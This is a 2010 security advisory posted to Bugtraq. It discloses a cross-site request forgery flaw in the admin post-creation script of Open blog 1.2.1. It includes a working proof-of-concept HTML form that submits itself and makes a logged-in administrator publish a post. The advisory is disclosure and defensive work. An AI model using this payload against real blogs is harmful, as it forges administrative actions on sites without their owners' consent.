
Date: Thu, 30 Dec 2010 10:47:46 +0100 (CET)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: CSRF (Cross-Site Request Forgery) in Open blog

Vulnerability ID: HTB22763
Reference: http://www.htbridge.ch/advisory/csrf_cross_site_request_forgery_in_open_blog.html
Product: Open blog
Vendor: K5 Storitve ( http://www.open-blog.info/ ) 
Vulnerable Version: 1.2.1
Vendor Notification: 15 December 2010 
Vulnerability Type: CSRF (Cross-Site Request Forgery)
Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
Risk level: Low 
Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 

Vulnerability Details:
The vulnerability exists due to failure in the "/admin/posts/create" script to properly verify the source of HTTP request.

Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

Attacker can use browser to exploit this vulnerability. The following PoC is available:


<form action="http://[host]/admin/posts/create" method="post" name="main" />
<input name="title" value="1" type="hidden" />
<input name="excerpt" value="<p>2</p>" type="hidden" />
<input name="content" value="<p>3</p>" type="hidden" />
<input name="tags" value="" type="hidden" />
<input name="publish_date" value="12/15/2010" type="hidden" />
<input name="status" value="published" type="hidden" />
<input name="allow_comments" value="1" type="hidden" />
<input name="categories[]" value="1" type="hidden" /> 
<input name="submit" value="Create" type="hidden" />
<input type="submit" id="btn" name="submit" value="Submit ››">
</form>
<script>
document.getElementById('btn').click();
</script>



